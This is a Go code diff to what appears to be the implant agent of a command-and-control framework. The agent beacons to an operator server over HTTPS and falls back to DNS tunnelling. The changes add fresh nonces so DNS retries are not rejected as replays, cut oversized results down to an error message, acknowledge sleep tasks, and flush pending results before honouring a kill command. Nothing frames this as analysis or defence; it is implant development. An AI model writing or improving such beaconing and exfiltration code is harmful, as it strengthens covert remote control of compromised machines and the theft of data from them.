@@ -1,6 +1,7 @@
 package agent
 
 import (
+	"errors"
 	"log"
 	"math/rand"
 	"os"
@@ -44,6 +45,7 @@ func Run(cfg *Config) {
 	consecutiveFailures := 0
 	var lastFailureLog time.Time
 	skipSleep := false
+	terminateAfterResults := false
 
 	for {
 		// Skip the sleep when we have a fresh result to deliver, so the output
@@ -93,7 +95,35 @@ func Run(cfg *Config) {
 		respBytes, err := sendBeaconHTTPSFn(client, cfg.ServerURL, encoded)
 		if err != nil {
 			if cfg.DNSDomain != "" {
-				respBytes, err = sendBeaconDNSFn(encoded, cfg.DNSDomain)
+				// A failed HTTPS call can mean the response was lost after the
+				// server accepted the beacon. Use a fresh nonce for DNS fallback so
+				// the retry is not rejected as a replay.
+				dnsNonce, nonceErr := beaconNonceFn()
+				if nonceErr != nil {
+					continue
+				}
+				beacon.Nonce = dnsNonce
+				dnsEncoded, encodeErr := protocol.EncodeBeacon(beacon, cfg.Secret)
+				if encodeErr != nil {
+					continue
+				}
+				respBytes, err = sendBeaconDNSFn(dnsEncoded, cfg.DNSDomain)
+				if errors.Is(err, errDNSBeaconTooLarge) && pendingResult != nil {
+					// Large results cannot be transported safely through DNS. Replace
+					// the blocking result with an explicit terminal error so later
+					// tasks can continue once HTTPS is unavailable.
+					replacement := &protocol.TaskResult{
+						TaskID: pendingResult.TaskID,
+						Type:   pendingResult.Type,
+						Error:  "result exceeded DNS fallback capacity; reconnect HTTPS and rerun the task",
+					}
+					pendingResults[0] = replacement
+					beacon.TaskOutput = replacement
+					dnsEncoded, encodeErr = protocol.EncodeBeacon(beacon, cfg.Secret)
+					if encodeErr == nil {
+						respBytes, err = sendBeaconDNSFn(dnsEncoded, cfg.DNSDomain)
+					}
+				}
 				if err != nil {
 					consecutiveFailures++
 					suspendPathBrowseOnFailure()
@@ -121,6 +151,9 @@ func Run(cfg *Config) {
 				skipSleep = true
 			}
 		}
+		if terminateAfterResults && len(pendingResults) == 0 {
+			return
+		}
 
 		task, err := protocol.DecodeTask(respBytes, cfg.Secret)
 		if err != nil || task.Type == "noop" {
@@ -131,6 +164,12 @@ func Run(cfg *Config) {
 			if secs, err := strconv.Atoi(task.Payload); err == nil && secs > 0 {
 				cfg.SleepSeconds = secs
 			}
+			pendingResults = append(pendingResults, &protocol.TaskResult{
+				TaskID: task.ID,
+				Type:   task.Type,
+				Output: "sleep acknowledged",
+			})
+			skipSleep = true
 			continue
 		}
 
@@ -138,7 +177,7 @@ func Run(cfg *Config) {
 		pendingResults = append(pendingResults, chunkTaskResult(result)...)
 
 		if task.Type == "kill" {
-			return
+			terminateAfterResults = true
 		}
 
 		// Deliver the result on the next beacon without sleeping first.
